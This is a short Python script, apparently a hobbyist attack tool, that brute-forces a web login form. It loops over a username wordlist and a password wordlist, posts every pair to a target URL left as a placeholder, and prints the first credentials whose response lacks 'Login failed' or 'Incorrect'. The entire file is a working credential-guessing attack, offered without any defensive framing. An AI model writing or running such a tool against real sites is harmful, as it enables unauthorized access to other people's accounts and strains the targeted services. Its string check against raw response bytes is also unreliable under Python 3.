#!/usr/bin/env python
import requests

traget_page = "[URL in action]"
try_data= {"username":"", "password":"", "login":"submit"}

with open("uname.txt", "r") as unamefile:
    for line in unamefile:
        name = line.strip()
        try_data["username"] = name
        with open("passwd.txt", "r") as passfile:
            for txt in passfile:
                passd = txt.strip()
                try_data["password"] = passd
                resp = requests.post(traget_page, data=try_data)
                if "Login failed" not in resp.content and "Incorrect" not in resp.content:
                    print("[+] Credential found --> USERNAME:" + name + "\tPASSWORD:" + passd)
                    exit()

print("[-] Unable to find Credentials, Upgrade your wordlist.")